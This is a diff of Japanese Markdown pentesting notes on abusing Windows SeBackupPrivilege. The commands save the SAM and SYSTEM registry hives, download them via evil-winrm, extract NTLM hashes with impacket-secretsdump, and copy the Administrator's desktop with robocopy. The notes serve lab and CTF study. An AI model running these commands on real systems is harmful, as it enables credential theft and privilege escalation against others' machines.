@@ -63,12 +63,12 @@ Active Directory Domain Servicesを実行しているっサーバーであり、
 ## 特権
 `SeBackupPrivilege` 通常Backup Operatorsグループのメンバーやシステムアカウントに付与される特権。Windowsの通常ACLを無視してアクセスできる。  
 ```bash
-# レジストリからオフラインパスワードクラック
+# レジストリからNTLMハッシュの奪取
 reg save hklm\sam sam # SAMレジストリを保存
 reg save hklm\system system # SYSTEMレジストリを保存
 download sam # evil-winrmを使用したダウンロード
 download system # evil-winrmを使用したダウンロード
-secretsdump.py -sam sam -system system local # impacketのツール
+impacket-secretsdump -sam sam -system system local
 
 # robocopyを使用した管理者フォルダのコピー
 robocopy /b C:\Users\Administrator\Desktop\ C:\
